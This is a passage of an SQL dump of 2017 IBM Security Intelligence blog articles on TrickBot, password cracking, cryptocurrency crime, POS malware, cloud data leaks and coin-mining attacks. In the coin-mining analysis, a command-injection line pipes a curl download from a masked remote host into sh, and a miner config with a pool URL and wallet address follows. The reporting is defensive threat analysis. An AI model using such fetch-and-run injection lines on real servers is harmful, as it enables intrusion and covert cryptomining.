throughout corporate networks and caused massive Active Directory lockouts. Delivery methods are not the only things TrickBot changes often; it has also been evolving its code over the past year. Q3 was especially active for TrickBot, which added modules to its existing hidden desktop and data theft capabilities. In July, TrickBot’s developers added support for the EternalBlue exploit, a tool borrowed from attacks such as   and   that allows it to spread through enterprise networks, along with a new worm feature it adopted to fetch its payloads from malicious remote servers. TrickBot targets mostly business banking services, according to X-Force Research, so this addition is not a surprise. By August, TrickBot already had   designed to steal Outlook email and browsing data. These modules do not feature the same code sophistication the core malware and modules present and were likely written by other developers. This could suggest that the TrickBot team recently took on new, less experienced members. In early September, TrickBot’s operators   to their configuration files, aiming to steal user credentials for platforms such as the American-based   and the Luxembourg-based  . Both exchange different types of cryptocurrency coins. This addition enabled TrickBot’s operators to take over victims’ wallets and empty them or use them as part of a network of wallets to move other coins and wipe their illegitimate traces. TrickBot has managed to spread to a large number of countries and language zones in relatively little time. The malware operates redirection attacks in over 20 countries and targets banks in over 40 countries spanning Asia, Europe, North America, South America, Australia, New Zealand and the Nordics. In terms of the top geographies on TrickBot’s radar, the focus changes in different configurations, which are attributed to infection cycles destined for each country or region. In recent attacks in which a large number of countries appears on the same list, X-Force data showed the following distribution: Unlike most Trojans, which mainly target the larger parts of Europe such as the U.K., Germany and France, TrickBot also targets banks in smaller unlikely countries, some of which were previously part of the Soviet bloc. Some examples include Bulgaria, Lithuania, Latvia, Slovenia and Slovakia. These countries, where the economy is not as strong and people are less likely to have high residual incomes, are much less likely to be used as run-of-the-mill targets and are more often exploited as cash-out routes for the TrickBot gang. TrickBot is currently the sixth most prevalent financial malware family in the global financial cybercrime arena, as show in Figure 3. The   is an evolving malware project that appears to have funding and alliances in the cybercrime arena. According to X-Force Research, its targets are mostly business banking, wealth management and private banking services, which simply means that the malware’s operators are after corporate money and hefty illicit profits. This gang is believed to be organized, international and unlikely to disappear anytime soon. X-Force Research expects to see TrickBot continue to target banks, organizations and consumers in Q4 2017. To keep up to date about this malware, follow our ongoing   on TrickBot.', '\'Banking Malware\', \'Banking Security\', \'Banking Trojan\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Malware\', \'Threat Intelligence\', \'TrickBot\', \'Trojan\'', 'https://securityintelligence.com/trickbot-takes-to-latin-america-continues-to-expand-its-global-reach/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (71, 'The ‘Cracken’: The Evolution of Password Cracking', 'David Bryan', '2017-10-10', 'I remember the days when an eight-character password was considered secure. But that’s not the case anymore, so let’s talk a little bit about the history of password cracking, how far we have come and what   has built. First, a little teaser of where we are at today: The image below shows theoretical MD4 hash rates for Microsoft Windows NT LAN Manager (NTLM) with no salting. We have two of these rigs, so we could do 664GH/s of NTLM. What does that mean? If you have a seven-character password, I can   all possibilities in about a three-minute run. Eight characters, you say? It takes us about 12 hours to brute-force it. \n \n Now let’s talk about where we came from. In the early 2000s, we had   for password cracking. John was a great tool for breaking Unix password hashes. You just needed to compile a good list of dictionaries together, and it would plow though the list of password hashes in a few hours, days or weeks, depending on the hashes that you were attempting to break and how many central processing units (CPUs) to you had. Back then, you were lucky to have a dual or even quad core machine to use for cracking password hashes. Sometimes you would use your own desktop or, if you were lucky enough to get it to cross-compile one of the Sun Sparc servers with four or eight CPUs, you could let your password hashes run for a week or so. It wasn’t fast, and it didn’t have a huge list of passwords or the crazy permutations that we have today, but it mostly worked because very few people deviated from a standard password that looked like it came from the dictionary. Then came rainbow tables. The concept behind this method is that it’s basically a giant lookup table for password hashes. These took up 500 GB to 2 TB, depending on the hashing algorithm and how complex you wanted the dataset. Rainbow tables were perfect for breaking LAN manager password hashes because the hash was computed by splitting it into two seven-character password segments, then hashing each side. This means that your 14-character password became two seven-character passwords — a flaw that made password cracking so easy. It could take 20 to 60 minutes to run a rainbow table attack on some systems. Then people got wise to password cracking and started disabling LAN manager hashes and using  . Sometimes, they required numbers or even — gasp — special characters for their passwords. For LAN manager hashes, rainbow tables worked great. However, when it came time to crack NTLM hashes, which were 16 bytes long, it was a different story. Rainbow tables were only good for short passwords of eight or nine characters. No longer could you split a password into two seven-character passwords — it was all or nothing. A while back, John the Ripper was forked and made what was known as the  . This fork included experimental hashes as well as support for OpenCL, multithreading, CUDA drivers and more. It was an improvement, but it was hardly a twofold performance factor increase on systems. Then along came   from the   Crack Me If You Can contest. These made cracking 10- and 14-character passwords much easier. It took several hours, if not a full day, to run though your word lists and the rules, but if someone was using “Winter2010,” “Monday2010” or “Passw0rd!2012,” there was a high chance of being able to recover it. At the same time this was going on, a group started developing hashcat/oclHashCat/cudaHashcat. In our next post, we will review our hardware, how we speced it out and how not to burn down your house/closet/data center. I will also show a teardown of one of these cards, and what putting some new thermal grease on one card has done.', '\'IBM Security\', \'Password\', \'Password Management\', \'Password Protection\', \'Penetration Testing\', \'X-Force\'', 'https://securityintelligence.com/the-cracken-the-evolution-of-password-cracking/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (72, 'Cybercrime’s Cryptocurrency Gold Rush: Going Strong!', 'Limor Kessem', '2017-10-4', 'What’s the connection between cybercrime and cryptocurrencies? Perhaps it would suffice to say that the reasons for criminals adopting the cryptocoin are quite obvious. But when did this all start, and what fuels it and gets fueled in return? This blog will go over some of the historical reasons that connect cybercrime and cryptocurrency as well as examine the possible consequences of that connection. Cybercriminals and anonymized payment methods always kept a close relationship for obvious reasons. One of the most lucrative aspects of online crime is the ability to conceal one’s identity, and using cryptographic currencies is part of that overall scheme. Historically, the connection between cybercrime and cryptocoins was not always the default. In the years before the   emerged, when fraudsters mostly congregated on IRC channels and in underground forums, that relationship was backed up by other means. From prepaid payment cards to alternative goods, such as stored value cards or even loyalty points and air miles, fraudsters flocked to platforms that allowed users to identify themselves only by digital means, without demanding any solid proof of identity or verifying it, for that matter. Over the years, these platforms gradually became less lucrative to the cybercrime crowd because of two major reasons. One such case was WebMoney, which was a payment platform established in Moscow in 1998. Unlike competing platforms at the time, WebMoney (WMZ) did not require connection to a bank account or credit card. Although it was an inherently legitimate business, it   who used it as their top cash and credit exchange platform.  , the Ukrainian government accused WebMoney of illicit activity and seized $7.5 million in WebMoney-linked companies’ bank accounts, as well as computer systems used for the operation of the platform. WebMoney had to clean up its platform, which it did. It rose above its past issues to become a banking partner and active global exchange platform to this very day. One of the most publicized cases of a platform shutdown was that of Liberty Reserve, the exchange platform that became the de-facto standard in cybercrime forums until it was investigated by law enforcement, found to have laundered $6 billion, and  . Preeta Bharara, the then U.S. attorney for the southern district on New York who charged the case, said that the organization became the “bank of choice for the criminal underworld.” The   befell other players such as e-Gold, which was another very popular exchange platform cybercriminals favored. The reaction in the underground world was to   to another, similar platform called  . But that did not last, possibly because of its similarity to the previously failed Liberty Reserve. It was around that time that the cryptocurrency connection, especially with bitcoin, gained a foothold in the cybercrime arena — not because it had any connection to illicit activity, but because of its inherent ability to keep users anonymous while providing monetary value. Although some cybercriminals started adopting bitcoin as their preferred payment method earlier on, it was the 2013 shutdown of Liberty Reserve that marked the end of an era and saw practically every illicit service and commodity peddler move to exchange money via a bitcoin wallet. Seeing the rising value of cryptocurrency in the underground, banking Trojans that used to solely focus on bank websites then started to either   on the infected endpoints they managed to control. As the value of the currency continued rising in the legitimate world, it also increased the affinity of cybercriminals for the cryptocoin and for other coins that came after it. At the time of this writing, the bitcoin exchange rate to U.S. dollars is at $3,961 per coin. This number is only one point in the historical rise for bitcoin, which has kept a steady upward movement in the past three years, even after facing many trials and tribulations, such as  ,  ,   and a ton of  . This bitcoin price history chart illustrates the continued rise, and shows that the liftoff began in 2013. \n \n While these changes started taking shape starting 2013, another phenomenon was about to explode, linking the world of cybercrime and cryptocurrency even more tightly together: cryptoransomware! Ransomware itself is a very old threat. Its first in the wild occurrence  , when a malicious locker was distributed to people over a floppy disk. But the phenomenon took time to gain speed, mainly because criminals had a hard time collecting money for their misdoings in a way that would not expose their true identity. For many years, fake applications and fake screen lockers demanded payment in prepaid vouchers. While that endeavor was somewhat profitable, it never reached notable magnitude. It might have taken some time for cybercriminals to catch on to the bitcoin hype, but only because it was not worth enough just yet. In 2010, bitcoin never crossed the $1 per coin, and its status was still too unclear, as were the exchange options. All that changed when cryptoransomware entered the playing field in 2013 with the ability to encrypt data with strong cyphers using symmetric or asymmetric encryption, and sometimes using both. From the get-go, cryptoransomware fittingly relied on cryptocurrency to fuel its development, distribution and deployment across the globe, gaining unprecedented momentum in no time. By 2015, a single cryptoransomware gang, CryptoWall 3.0, had been tied to more than   from infected victims who ended up buying bitcoin and paying the criminals to get their data back. By 2016, ransomware was the malicious deliverable in up to  . The FBI estimated ransomware losses to   by the end of 2016. With the advancement of bitcoin, the rise of cryptoransomware became no less than a gold rush in its own right. Nowadays, ransomware codes are available as open source, can be bought in Dark Web markets for under $100, and some are even operated by organized cybergangs. By 2017, the world saw   debilitate organizations,   and   systems across the globe with new capabilities and flash distribution that leveraged  . Throughout all these attacks, the demands had one thing in common: Attackers wanted the ransom in bitcoin or another cryptocurrency, yet again tightening the link between cryptocurrency and illicit business. Cryptocurrency does not only attract ransomware operators, of course. The major financial fraud players in the cybercrime arena are happy to steal coins. To do that, various malware operators have incorporated the URLs of cryptocurrency exchange platforms into their malware’s target lists. That way, when an infected victim browses to an exchange platform, the malware goes into the same type of action it would perform when the target accesses a bank account: Redirect the user to a phishing page, manipulate what he or she sees on the screen, steal the access credentials, and take over the cryptowallet to empty it. Some names that come to mind from that grade of banking Trojans are Dridex, TrickBot and Zeus Sphinx, all of which   platforms. That being said, a ton of other, less sophisticated malware, both past and present,  , mostly by making infected endpoints mine coins. That endeavor is quite resource-heavy on any normal endpoint and is bound to cause the user to eventually clean their PC due to slow performance. One recent occurrence even had a browser extension   coins for Pirate Bay without users knowing about it or opting in. On the enterprise front, IBM X-Force has recently noted a  , designed to enslave endpoints into benefiting the criminals who operate these codes. After stealing or illicitly mining coins, attackers aim to anonymize them even more. Stolen coins are moved to coin mixers, which are services that will pass them in bits and pieces through many other wallets, making the trace much harder or virtually impossible. With immense development and adoption of cryptocurrency and its decentralized nature, the cryptocoin is here to stay. The more the value of different coins rises, the more lucrative they become to both everyday people and those who value their anonymity. Unfortunately, the top anonymity seekers are people with  , which can tie a perpetual bond between cybercrime and cryptocurrency. Can that bond be severed? Can cryptocurrencies be adapted to the everyday user, affording them relative anonymity all while removing that mask in cases of suspected crime? Would we be delving into the same old pool of privacy and surveillance by going that route? Perhaps. The way things stand at this time, cryptocurrency users are not entirely untraceable due to the nature of the blockchain concept that makes every movement trackable to an extent. As FBI Assistant General Counsel   in September 2015, “investigators can follow the money” in the world of bitcoin. One thing that’s absolutely sure about crypto is that nothing is sure about crypto. No one can really tell now how it will evolve and how eventual associations to the everyday banking systems will end up tying it to  . Meanwhile, these currencies continue to   among consumers, startup entrepreneurs and businesses from all walks of life. Not only do they give rise to the creation of new coins, new options and new rising exchange platforms to accommodate the traffic of cash to and from those crypto systems, but they are also changing the face of fintech as we know it. Just as cybercrime’s roots are in the same social phenomena that have been plaguing humanity since the dawn of days, the same trends are applicable to the underworld of online crimes, where different currencies are the top choice for ill-doers of the web. That is likely to remain the same. Some things that can be done to   taking place on legitimate infrastructure is to   to provide additional details on each transaction, which would keep users anonymous to one another but not necessarily completely masked. That’s bound to make cryptocurrencies lose most of their luster for cybercriminals and drive many out of that realm.', '\'Bitcoin\', \'Bitcoin Mining\', \'Cryptocurrency\', \'Cryptography\', \'IBM X-Force Research\', \'Ransomware\', \'X-Force\'', 'https://securityintelligence.com/cybercrimes-cryptocurrency-gold-rush-going-strong/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (73, 'POS Malware Breach Sees Payment Cards Hit Underground Shops', 'Limor Kessem', '2017-10-3', 'News about POS malware breaches affecting two retailers hit the headlines last week, this time featuring a fast-food restaurant chain in the U.S. that operates around 3,500 locations across the country, most of which are franchised, and a popular supermarket. Both entities, like others before them, were notified of suspicious activity by a third-party service provider who spotted the potential issues. The breaches could have originated either from internal vulnerabilities or through third-party suppliers. In one of the cases, the card breach was   on Sept. 26, but the card information had apparently been up for sale in underground online shops for over a week. One illicit shop in particular, known as Joker’s Stash, reportedly had been selling the cards under the batch name FireTigerrr since Sept. 18. Another cybercrime service that checks card validity for fraudsters saw the first batch appear as early as Sept. 15. This means the breach has been collecting data on an ongoing basis. According to the cards-for-sale lists from the shop, the incident spanned locations in a variety of states. See Figure 1 below (Note: In fraudster lingo, dumps refer to card data stolen from the magnetic stripe of the compromised card and subsequently used for cloning the data onto blank plastic cards).\n \n Attacks against organizations that operate a large number of point-of-sale (POS) endpoints are fruitful for cybercriminals looking to gain access to credit card information, which is precisely why we’re seeing   than ever.   was being investigated during the writing of this post and, once again, payment card data was the target. \n To mitigate the risk of  , security professionals and the C-suite must focus on two major angles. The more immediate and low-level one is the POS malware angle. Although it sounds like a technical matter, it touches on many aspects of the organization’s information security.  has been around for over a decade now,   ranging from lone fraudsters to  . Through the years, POS malware has not made significant strides in technical terms, simply because it has not needed to. Most POS malware codes are   that make their way into the target endpoint, focus on reading unencrypted card data in the random access memory (RAM) zone and steal data amassed through the days and weeks of the breach. Since most POS endpoints are not regularly used for internet browsing, RAM-scraping malware can make it to the endpoint through: One of the most recent examples of POS malware modus operandi is  . Attackers begin by penetrating the target organization’s systems to reach the control zone for different POS endpoints. They connect to the endpoint using remote access, either one that’s already installed or one they activate, such as virtual network connection (VNC) or remote desktop protocol (RDP) access. The connection can be made by stealing or guessing the password. Once in, the attackers install the POS malware on the endpoint. From there, the malware runs in the background and continually sends out the stolen data to the attacker’s designated server. The POS malware angle is also an overall malware angle. Organizations normally mitigate this threat with appropriate  , encryption, and antimalware controls. That said, the inherently decentralized nature of the security scheme for chain stores and restaurants makes for an added challenge. With so many franchised locations, it is difficult to enforce the same controls throughout all the environments. This calls for applying very defined standards and then monitoring to ensure that those are upheld in all locations. Moreover, when there are so many POS endpoints exposed to the access of an unlimited number of employees working in different locations, securing the POS demands much more control than any other endpoint operated by office-based organizations. Fortunately, most organizations have Payment Card Industry Data Security Standard (PCI DSS) compliance and security hygiene measures implemented to help mitigate the threat from the more obvious entry points, including: Beyond security hygiene and adhering to a security framework and best practices, many organizations are failing to prioritize testing their POS endpoints, likely because they expect to buy a secure product out of the box. That’s not always the case because POS endpoints can contain security issues in the hardware, hand-held devices, POS software application and all the custom code that goes into such applications. If developers fail to regularly test those endpoints, criminals are likely to do just that: test for gaps, and attempt to compromise that merchant to access the plethora of vulnerable POS machines it operates. Threat actors use a number of techniques, from   to obtaining POS machines to run their own testing, to identify security gaps and plan their attacks accordingly. For cybercriminals, POS endpoints are the low-hanging fruit because these potential vulnerabilities are not as thoroughly documented as those of other operating systems. When testing POS systems that were never checked before, testers often find issues very early on in the process. On the merchant’s side, organizations that buy and operate POS machines often rely on the basics of Payment Application Data Security Standard (PA-DSS) requirements, which are derived from the PCI-DSS standard but do not always offer the level of testing that the endpoints require. To minimize the window of opportunity for attackers, the security team should contract a   to perform manual testing on the POS itself, in addition to the network security that’s applied to the connecting systems. When testers identify vulnerabilities, the merchant’s security team can turn to its vendor with a requirement to fix the gap. In cases where the gap cannot be remedied, the security team can give an accurate assessment of the risk and subsequently apply the necessary mitigation strategies and compensating controls to ensure that the risk aligns with the organization’s risk appetite. This is an easy win for a chief information security officer (CISO), especially since card breaches have been prevalent and well-documented, to illustrate the business case for mandating more security. Of course, card breaches would mean a lot less to criminals if they could not use the data to clone new cards. That can happen if more banks adopt chip-and-PIN cards across the board. This is no silver bullet to prevent all misuse of payment card data, but it will greatly limit fraudsters’ ability to clone cards due to complication and cost. Better card security can drive more criminals to the online channel for card-not-present (CNP) fraud, but that channel has already taken steps toward becoming more secure. Overcoming these hurdles can help weed out the less skilled bunch over time, which may result in an overall drop in fraud rates. The second major angle of the card breach epidemic is the break-in through third-party vendors. Every organization holds numerous relationships with third parties that have access to its infrastructure. These relationships can sometimes be abused when an attacker conducts reconnaissance and looks for the path of least resistance. Breaching secure organizations through third parties is a   concept and can happen to just about any company. Security measures should be revisited and enhanced to help limit exposure to a bare minimum, determine liability and set up an effective response strategy. When contracting third-party providers, their infrastructure and access to the organization’s own resources become extensions of the overall security and risk management plan. During the contract negotiation phase, information security management must come into the process to conduct a risk assessment, share and establish requirements and procedures, identify potential gaps and ways to address them, and build the necessary blocks directly into the contract with the provider. Relevant network access and adherence to security requirements should be monitored and periodically audited to limit the potential for error or oversight. This is where the vendor relationship comes into play once again for addressing security issues in the hardware and software contract. The contract has to contain a detailed security section to define what types of security issues will be addressed, how rapidly, and who holds the liability in the interim. Even with all security controls in place, a breach by a persistent, advanced and motivated threat actor can befall any organization of any size in any sector. With the   quantified, the business case of a response plan is very straightforward. The criticality of incident management and response cannot be stressed enough. The ability to manage incidents according to a tested plan can define the results, affecting both the hard costs of a breach and the softer costs or collateral damage, including reputational damage,   and  . Whether a DIY program based on a  , a   or  , an  , along with plans adapted to the organization’s risk profile, business continuity goals and contingency resources, can dramatically reduce the time to detect issues before they become problems. IR can further contribute to   of a data breach. It is important to gather an IR team, establish skill-based roles and then   regularly to train the team and achieve better results over time. But aside from the technical side of the response plan, the literal response — the one made of words and numbers — can be the first and most impactful part of recovering from a breach. Crisis communication and media relations have become critical parts of responding to a breach at the earliest stages of having to disclose it. Since you don’t want the bad news to reach the media prematurely, this sensitive stage of the discovery process can potentially affect the response from regulatory, insurance, legal, customers, public stakeholders, and the organization’s own management and employees. It is vital to consider the media response in the overall incident response plan and assign the proper stakeholders to the task. Defining who should speak for the organization in the event of a breach can help employees and lower management avoid having to respond to unvetted questions from reporters without authority. More importantly, preparation helps designated executives speak about incidents with clarity and precision, assuring all stakeholders that proper containment, investigation, eradication and reporting processes are underway. Neglecting to   in times of crisis can result in loss of goodwill and heavy  , potentially including the resignation of top executives. Very large payment card data breaches have been rising in numbers over the past five years due to the entry of   into that playing field. In the wake of a breach, affected consumers should follow these tips:', '\'Data Breach\', \'Malware\', \'Malware Analysis\', \'Payment Card Industry (PCI)\', \'Payment Card Industry Data Security Standard (PCI DSS)\', \'Point-of-Sale (POS) Systems\', \'POS Malware\', \'Retail\', \'Retail Data Breach\'', 'https://securityintelligence.com/pos-malware-breach-sees-payment-cards-hit-underground-shops/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (74, 'Put Threat Intelligence Into Action With Security Apps', 'Security Intelligence Staff', '2017-9-27', 'It’s now easier than ever to make threat intelligence from IBM X-Force Exchange actionable. Since its inception in 2015, X-Force Exchange has provided both granular indicators of compromise and higher-order intelligence through public collections to help shorten security investigations. A recent update to the   collaborative platform now offers recommended apps from the companion IBM  , based on the content of public collections, to help users implement threat intelligence into their end-to-end security portfolio. The Petya   in Europe earlier this year worked quickly. With the attack intending to   rather than hold it hostage, every minute mattered. By using the recommendation engine on X-Force Exchange, users researching the “ ” public collection on IBM X-Force can now view related apps from App Exchange that can help put threat intelligence on Petya into action. Users of the IBM X-Force Exchange will now see suggested apps from the App Exchange relevant to the content they are viewing. In this case, the   for QRadar will add real-time threat intelligence from X-Force Exchange into the IBM QRadar SIEM — including any related reports on IP addresses and known malware hashes. In addition, the   provides additional rules in QRadar that implement the Threat Intelligence integration strategy and the   adds additional detection based on Snort signatures and collaboratively developed threat intelligence to offer higher-fidelity detection of the NotPetya variant. Existing app users on App Exchange visiting the page for a particular app will now find related apps at the bottom of the page from both IBM and our network of security partners. If you visit any of the apps related to the Petya Ransomware Campaign Collection, you’ll discover recommended apps for additional threat intelligence sources, including those from partners such as Jeskell CyberSentinel, FireEye,  , ThreatConnect and more.', '\'IBM Security App Exchange\', \'IBM X-Force Exchange\', \'Petya\', \'Threat Intelligence\', \'X-Force\', \'X-Force Features\'', 'https://securityintelligence.com/put-threat-intelligence-into-action-with-security-apps/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (75, 'Leaking Cloud Databases and Servers Expose Over 1 Billion Records', 'Jason Kravitz', '2017-9-21', 'As   recently pointed out, some clients of cloud service providers such as Amazon and Microsoft are accidentally leaving their cloud databases exposed due to misconfigurations of their services. Coupled with recent headline-making breaches, it’s becoming clear that the greatest risks to an organization might come down to a simple permission error or server misconfiguration. There was a time not long ago when SQL injection was everywhere. From 2011 to 2013, IBM X-Force tracked a number of publicly disclosed data breaches that were often the result of fairly trivial  , resulting in the loss of millions of email addresses, passwords and other sensitive data. In the years since, it seems that vendors and businesses are doing a better job of protecting against SQL injection. But in its place, simple permission errors, API oversights and server misconfigurations have become even more pervasive. In 2017 alone, as of September, IBM X-Force has tracked more than 1.3 billion (yes, billion) exposed records from misconfigured servers — from just 24 incidents. To put that in perspective, these misconfigurations make up 71 percent of the total number of reported leaked records for 2017 so far. Compared to the impact of SQL injection, X-Force researchers tracked just 97 million records from this attack type at its peak during the three-year period between 2011 and 2013. In short, far fewer incidents are exposing much more data. Cloud services are increasingly easy to set up and can scale to store hundreds of millions of records. They are ideal for archiving large data sets such as marketing lists and customer contacts, and are often used as a back end for mobile apps, which handle large numbers of users and varying types of sensitive data. In this year alone, cloud server misconfigurations have exposed  ,  ,   from a major telecommunications company,   from an e-commerce pet store and personal details of  , to name a few. One disturbing recent incident involved an   from a toy company that makes teddy bears that can play back audio recorded by parents for their children. All of these audio files were sitting open on the web for anyone to access. Another misconfigured file server from a   contained audio recordings of crime reports and confidential informants, along with other highly sensitive information. These unsecured cloud databases shined a light on other concerning privacy issues. It is not surprising to most people that their social media postings and profiles can provide a lot of publicly accessible data points. Given the ease of scraping these sites using application program interfaces (APIs) and other methods, marketers and research groups have begun storing personality profiles derived from social media data without users’ approval or awareness. These profiles can contain in-depth data on people’s opinions, preferences and views. As a result, this is prized data for marketers, voter demographics and other applications requiring precise targeting. While there is nothing outwardly illegal about collecting publicly accessible data, it does bring into question the ethics of storing this information en masse, particularly on an improperly secured cloud database. Given that most people are unaware they are being tracked in this way, there is little to no recourse to opt out. Marketing and research groups are not the only ones amassing archives of public data. Considering the huge amount of leaked records over the last five-plus years, there are billions of email addresses and password combinations   on the Dark Web. Just two of the incidents tracked by IBM X-Force were responsible for over 1 billion exposed records so far this year. Interestingly, in both cases, the incidents involved spam groups. In the first case, the operational intricacies of a quasi-legitimate affiliate marketing organization were exposed by an  , which provided public access to their spam tactics and more than 393 million unique email addresses used for campaigns. In August, a security researcher discovered a misconfigured command-and-control (C&C) server used by a spambot, which contained   email addresses, passwords and Simple Mail Transfer Protocol (SMTP) credentials. \n SQL injection attacks were so prevalent in years past because it is fairly easy to scan public-facing servers to find vulnerable targets. Similarly, tools such as the   make it much easier to search for publicly accessible cloud databases and services. In the last few years, a handful of dedicated security researchers have uncovered hundreds of millions of exposed data records that were publicly accessible without any form of login or authentication. While cloud vendors all publish guidelines on how to secure a production system, there are still thousands of open instances for a variety of reasons: Another troubling trend is drop locking, in which attackers scan for misconfigured open systems such as MongoDB databases and then drop database tables or lock out legitimate users to extort a ransom payment. From December 2016 into the first part of the year, researchers at the GDI Foundation tracked more than   in which tables were either dropped or encrypted for ransom. The original attack involved copying the database in full, removing or replacing the tables, and notifying the database owner to pay the attacker by leaving a text file on the server where the data once resided. However, at one point, due to the ease of exploitation, there were multiple groups vying to extract a ransom on these same open systems. At times, these competing groups overwrote each other’s ransom demand messages, making it even more difficult for victims to retrieve their stolen data. In August 2017, GDI noted a revival of these attacks, resulting in another wave of 26,000 locked databases, with one attacker alone hijacking 22,449 instances. Analyzing the threat and risk will always lead to a better understanding of the potential impact and help to define necessary controls. The first step should be to conduct a proper risk assessment on the cloud deployment you or your organization uses. Apply data confidentiality controls such as  . If used effectively, this can minimize the impact in a case of leaked data. Fortunately, more cloud vendors are helping with control options, gating data behind   so that it is more secure out of the box, even at the potential expense of accessibility. For enterprise customers contracting the services of a cloud provider, embed your security policies into the contract to ensure cooperation from your vendor. Always review vendor best practices before going into production, conduct a pilot with test data or, better yet, consider periodically engaging a professional   to map vulnerabilities and inadvertent access issues. Stay up to date with the latest security incidents IBM has been tracking on the   website. You can also use reliable   to stay apprised of any new threats that may apply to your organization and help you re-assess risk.', '\'Cloud\', \'Cloud Computing\', \'Cloud Security\', \'Data Breach\', \'Data Privacy\', \'Data Protection\', \'Database Security\', \'IBM X-Force Research\', \'SQL Injection\'', 'https://securityintelligence.com/leaking-cloud-databases-and-servers-expose-over-1-billion-records/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (76, 'Network Attacks Containing Cryptocurrency CPU Mining Tools Grow Sixfold', 'Dave McMillen', '2017-9-19', 'Since we last reported on a version of the   containing cryptocurrency coin-mining tools in April, the IBM X-Force has noticed a steep increase in the volume of coin central processing unit (CPU) mining tools used in cyberattacks, specifically those targeting enterprise networks. According to IBM Managed Security Services (MSS) data, there have been peaks reaching more than a sixfold increase in attacks involving embedded mining tools in the eight-month period between January and August 2017. This is not surprising, since a recent third-party report noted that detections for cryptocurrency mining Trojans has   in the last few years. All of the attacks analyzed by IBM X-Force during that period involved the same mining tool with the capability to mine several different coins. These tools were hidden within fake image files, a technique known as steganography, hosted on compromised web servers running Joomla or WordPress, or stored on compromised JBoss Application Servers.\n In most cases, the attackers attempted to mine   such as Monero (XMR), which employs the CryptoNight mining algorithm. Command injection (CMDi) attacks, detected by IBM Security’s managed   service, attempted to plant the malicious images on victims’ machines using WGET and CURL shell commands when victims simply visited the page via a link in an email or through a compromised site. Since MSS data only showed the results of the attack in the form of a request for a known malicious file, our researchers noted at least two possible scenarios: A review of industries targeted revealed that manufacturing and financial services, both at 29 percent, tied for the industry experiencing the highest volume of these types of attacks. Other industries that have been targeted include arts and entertainment, information and communication technology, and retail.\n The reason why certain industries were targeted over others is not easily explained. Although we have not identified any specific tools being used to scan for weaknesses in these platforms, we understand that it is a prerequisite in the exploitation of this attack type. Attackers are likely targeting industries with the most vulnerable targets versus those that offer some type of advantage in terms of mining virtual currency.\n Let’s take a look at the contents of one of the malicious file images delivering a coin miner, how the mining tools are hidden and what it looks like when they are launched. For this example, we’ll focus on an attack targeting a  . Attack Context:\n URL=/jexws4/jexws4.jsp,arg=ppp=echo+%22%2A%2F33+%2A+%2A+%2A+%2A+curl+http://xx.xxx.xx.xxx/themes/logo.jpg|sh\n The URL path above indicates a JavaScript file that is not native to JBoss software: jexws4.jsp is a component of the   exploit tool. JexBoss is a tool for testing and exploiting Java deserialization vulnerabilities in JBoss application servers. If JexBoss is resident on the target machine, it would indicate that the server is compromised and will allow shell commands to be executed. The context shows a CURL command issued with a URL to an image file, which is then sent to the shell interpreter. Upon further examination, the image file contains shell code and is not really an image file at all. The shell code instructs the victim host to download: “url” : “stratum+tcp://xx.xxx.xx.xxx:80”,\n “user” : “46XG1vfKxfE1yQnPkrwdQoUDdewkqxCz8ZUnjtu4HH6j27uaWdXaC8D43Vax6XVZmGb3MTHaULEBoiBo7DbP3PPJLyffUcF”,\n “pass” : “x”,\n “algo” : “cryptonight”,\n “quiet” : true\n When we executed this mining tool in our lab, it connected to the aforementioned site and began mining Monero using the CryptoNight algorithm, which is the one used by the CryptoNote-based group of currencies: \n To do the testing, our research lab set up an x86 machine with an Intel i5-6500 4 core processor running an Ubuntu server. At a hash rate of 46.69 H/s (hashes per second), this miner would make approximately $2.35 per month. Since organic infections would have every infected machine run its own rate of mining, it is difficult to speculate the profit of a botnet of, say, 10,000 hosts. Our findings did show the potential for Monero to be slightly more profitable than mining for the more popular bitcoin (BTC), for example, making it perhaps more attractive to attackers. This may be the reason for the jump in volume of attacks utilizing this type of mining tool. Other CryptoNote-based virtual currencies include: All of these cryptocurrencies are also found in the Mirai mining tool, mined along with bitcoin. Many virtual coin miners have been built to leverage the graphics processing unit (GPU) in infected endpoints, better known as the computer’s video card, not CPUs. This is because GPUs have large numbers of arithmetic logic units (ALUs) compared to central processing units (CPUs). This allows them to do large amounts of bulky mathematical labor in a greater quantity than CPUs. Since they are the more powerful math problem solvers and alternative virtual currency is becoming much more popular among miners, there has been an extremely   for high-end GPU cards recently. This has even resulted in a   of high-end GPUs, especially of those focused on mining. If GPU mining tools offer relatively greater mining power than CPU mining tools, then what would be an attacker’s attraction to CPU miners? Let’s ponder a few possibilities. Attackers can’t count on everyone running GPUs. They realize there is a large number of potential targets that are not utilizing GPUs. Most mainstream computers use integrated graphics processors (IGP), which consume less power and are much cheaper. However, they are much slower than GPUs. IGPs are built into the computer motherboard, whereas GPUs are optional add-on hardware that have much higher power requirements. The playing field is larger and there are more endpoints to enslave. The CryptoNight mining algorithm employed by CryptoNote-based currency is designed for mining on CPUs and can be efficiently tasked to billions of existing devices (any modern x86 CPU). However, a new mining tool called   was developed to leverage both GPUs and CPUs. A capability known as smart mining permits transparent CPU mining on the user’s computer without centralization of mining farms and pool mining, which is more in line with Satoshi Nakamoto’s original vision of a true peer-to-peer (P2P) currency. Smart mining is currently available for all flavors of mining tools across all operating systems. At first glance,   appear to be prime targets for mining because a vast majority of them are deployed with default settings, making them easy picking for compromise. However, their minimal computing power makes them less than ideal for mining bitcoin, even with a 1 million-device botnet. Profitability potentially increases when mining CryptoNote-based currency, but that choice still wouldn’t be as profitable as using server-based targets. Server-based targets have a wider range of power — certainly much more than the plethora of IoT devices that typically come with very little computing power. We may soon see a worm designed to mass-infect computers ranging from enterprise-level servers right down to the one from which you’re reading this blog to mine coins. On monitored devices, such activity would typically affect the endpoint’s performance and may be detected and shut down promptly after mining commences. Although this analysis focused specifically on a Linux variant, keep in mind that there are plenty of other flavors of mining tools for Windows, Android and Apple products such as home routers and other connected devices. Virtually any attack vector that involves injecting executable code could turn a targeted 